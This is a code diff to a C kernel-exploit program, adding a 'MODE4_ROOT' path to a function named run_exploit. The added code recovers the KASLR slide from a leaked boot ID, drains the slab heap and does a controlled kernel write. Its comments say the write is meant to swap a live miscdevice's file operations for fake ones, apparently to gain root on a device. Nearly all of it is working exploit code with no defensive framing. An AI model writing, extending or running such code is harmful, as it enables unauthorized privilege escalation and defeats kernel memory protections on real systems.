@@ -1201,10 +1201,13 @@ int run_exploit(int argc, char **argv) {
                     env_flag("MODE4_SLIDE", 0) ||
                     env_flag("MODE4_SLIDE_ZERO", 0) ||
                     env_flag("MODE4_SLIDE_VERIFY", 0) ||
-                    env_flag("MODE4_SLIDE_SWAP", 0);
+                    env_flag("MODE4_SLIDE_SWAP", 0) ||
+                    env_flag("MODE4_ROOT", 0);
   if (env_flag("MODE4_SLIDE", 0) || env_flag("MODE4_SLIDE_ZERO", 0) ||
       env_flag("MODE4_SLIDE_VERIFY", 0) ||
-      env_flag("MODE4_SLIDE_SWAP", 0)) {
+      env_flag("MODE4_SLIDE_SWAP", 0) ||
+      env_flag("MODE4_ROOT", 0)) {
+    if (env_flag("MODE4_ROOT", 0)) setenv("MODE4_SLIDE", "1", 1);
     setenv("MODE4_WRITE_PROOF", "1", 0); /* stamp chain gate */
   }
   if (write_proof && umh_available && !force_w1) {
@@ -1360,6 +1363,39 @@ int run_exploit(int argc, char **argv) {
     pr_info("WRITE_PROOF %s — stopping (no W1). MODE4_ONLY implied.\n",
             landed ? "POSITIVE store executes on-device"
                    : "NEGATIVE (walk miss / wrong alias / no write)");
+    if (env_flag("MODE4_ROOT", 0) && boot_after[0]) {
+      uint64_t rslide = slide_decode_from_bootid(boot_after);
+      pr_info("ROOT ph2: slide=%016llx bootid=%s\n",
+              (unsigned long long)rslide, boot_after);
+      if (rslide) {
+        kaslr_slide = rslide;
+        kaslr_base = (uint64_t)KIMAGE_TEXT_BASE + rslide;
+        kaslr_done = 1;
+        pr_success("ROOT: slide=%016llx\n", (unsigned long long)rslide);
+        unsetenv("MODE4_SLIDE");
+        unsetenv("MODE4_SLIDE_ZERO");
+        unsetenv("MODE4_SLIDE_VERIFY");
+        setenv("MODE4_SLIDE_SWAP", "1", 1);
+        usleep(200000);
+        slab_drain();
+        /*
+         * Heap geometry must replicate SS1/SV1 exactly: parent=P0(boot_id
+         * uuid buffer)-8 (harmless string scratch). The REAL write
+         * (fake_fops -> P0(MISC.fops)) comes from the SLIDE_SWAP stack
+         * stamp, which hardcodes its own tree_l. Passing MISC here would
+         * point the heap pi erase at the live miscdevice.
+         */
+        uint64_t boot_off =
+            (active_offsets && active_offsets->off_slide_boot_id)
+                ? active_offsets->off_slide_boot_id
+                : SLIDE_SYSCTL_BOOTID_OFF;
+        do_one_write(data_addr(KIMAGE_TEXT_BASE + boot_off), "ROOT swap", 4);
+        pr_info("ROOT swap done cfi=%d wr=%zd\n",
+                cfi_last_step, cfi_write_ret);
+        return 0;
+      }
+      pr_error("ROOT: slide decode failed\n");
+    }
     return landed ? 0 : 1;
   }
 
